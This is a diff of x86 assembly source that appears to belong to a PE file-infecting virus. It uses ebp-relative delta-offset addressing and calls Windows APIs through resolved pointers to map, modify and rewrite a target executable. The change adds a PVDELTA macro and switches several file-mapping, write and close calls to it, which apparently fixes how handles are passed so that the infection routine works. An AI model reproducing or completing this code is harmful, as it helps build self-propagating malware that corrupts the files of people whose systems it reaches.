@@ -24,6 +24,12 @@ PDELTA		macro	Addr
 			add	eax, ebp
 			push	eax
 		endm
+; Macro to avoid repetition when pushing offset value with delta
+PVDELTA		macro	Addr
+			mov	eax, offset Addr
+			add	eax, ebp
+			push	[eax]
+		endm
 ; If we change our mind on ebp
 DELTA		equ	ebp + offset
 ; Such wow
@@ -184,7 +190,7 @@ push	0
 push	0
 push	PAGE_READWRITE
 push	NULL
-PDELTA	PeFile
+PVDELTA	PeFile
 call	[DELTA pCreateFileMapping]
 cmp	eax, 0
 je	JumpCheckError
@@ -197,7 +203,7 @@ push	0
 mov	eax,	FILE_MAP_READ
 or	eax,	FILE_MAP_WRITE
 push	eax
-PDELTA	PeMapObject
+PVDELTA	PeMapObject
 call	[DELTA pMapViewOfFile]
 cmp	eax, 0
 je	JumpCheckError
@@ -372,11 +378,11 @@ add	ebx, 08h
 add	esi, edi
 mov	[eax], esi
 ; CLOSE
-PDELTA	PeFileMap
+PVDELTA	PeFileMap
 call	[DELTA pUnmapViewOfFile]
-PDELTA	PeMapObject
+PVDELTA	PeMapObject
 call	[DELTA pCloseHandle]
-PDELTA	PeFile
+PVDELTA	PeFile
 call	[DELTA pCloseHandle]
 
 
@@ -401,13 +407,13 @@ push	0
 push	0
 push	ecx
 push	esi
-PDELTA	PeFile
+PVDELTA	PeFile
 call	[DELTA pWriteFile]
 cmp	eax, 0
 je	JumpCheckError
 
 ; CLOSE
-PDELTA	PeFile
+PVDELTA	PeFile
 call	[DELTA pCloseHandle]
 
 
